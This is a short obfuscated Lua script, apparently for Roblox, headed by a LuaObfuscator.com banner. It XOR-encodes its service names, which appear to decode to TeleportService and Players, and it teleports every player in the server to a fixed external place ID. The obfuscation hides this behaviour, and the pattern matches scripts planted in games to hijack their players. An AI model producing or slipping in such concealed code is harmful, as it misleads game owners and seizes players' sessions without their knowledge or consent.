--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v11,v12) local v13={};for v16=1, #v11 do v6(v13,v0(v4(v1(v2(v11,v16,v16 + 1 )),v1(v2(v12,1 + (v16% #v12) ,1 + (v16% #v12) + 1 )))%256 ));end return v5(v13);end local v8=game:GetService(v7("\229\198\215\32\246\180\213\10\226\198\201\51\239\184\194","\126\177\163\187\69\134\219\167"));local v9=12501075357 -506674424 ;local function v10() local v14=0 + 0 ;local v15;while true do if (v14==0) then v15=game:GetService(v7("\19\193\43\220\249\49\222","\156\67\173\74\165")):GetPlayers();for v17,v18 in ipairs(v15) do v8:Teleport(v9,v18);end break;end end end v10();
